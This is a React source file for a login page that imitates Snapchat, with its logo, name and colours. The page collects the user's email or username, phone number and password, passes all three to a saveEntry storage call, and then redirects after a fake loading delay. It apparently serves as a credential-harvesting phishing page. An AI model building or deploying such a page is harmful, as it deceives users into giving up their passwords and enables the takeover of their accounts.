import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { saveEntry } from "@/lib/storage";
import ghostImg from "@/assets/snapchat-ghost.png";

export default function LoginPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.trim()) {
      setError("Please enter your email or username.");
      return;
    }
    if (!password.trim()) {
      setError("Please enter your password.");
      return;
    }
    setLoading(true);
    setTimeout(() => {
      saveEntry({ email, phone, password });
      setLoading(false);
      navigate("/home");
    }, 1200);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#FFFC00] px-4">
      <div className="w-full max-w-[340px] bg-white rounded-2xl shadow-xl px-6 py-7">
        {/* Logo */}
        <div className="flex flex-col items-center mb-5">
          <img src={ghostImg} alt="Snapchat" className="w-14 h-14 object-contain" />
          <h1 className="mt-2 text-[22px] font-black tracking-tight text-black">snapchat</h1>
        </div>

        <form onSubmit={handleLogin} className="flex flex-col gap-3">
          <input
            type="text"
            autoComplete="username"
            autoFocus
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email or Username"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />

          <input
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="Phone Number (optional)"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />

          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full border border-gray-200 rounded-xl px-4 py-2.5 pr-11 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
            />
            <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition">
              {showPassword ? <EyeOffIcon /> : <EyeIcon />}
            </button>
          </div>

          {error && <p className="text-red-500 text-[13px] text-center">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#FFFC00] hover:bg-yellow-400 disabled:opacity-60 text-black font-bold rounded-full py-2.5 text-[15px] transition flex items-center justify-center gap-2 mt-1"
          >
            {loading ? (
              <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
              </svg>
            ) : "Log In"}
          </button>

          <a href="#" className="text-center text-[13px] text-[#0070c9] hover:underline">Forgot Password?</a>
        </form>

        <p className="text-center text-[13px] text-gray-500 mt-4">
          Don't have an account?{" "}
          <button onClick={() => navigate("/signup")} className="font-bold text-black hover:underline">
            Sign Up
          </button>
        </p>
      </div>
    </div>
  );
}

function EyeIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  );
}
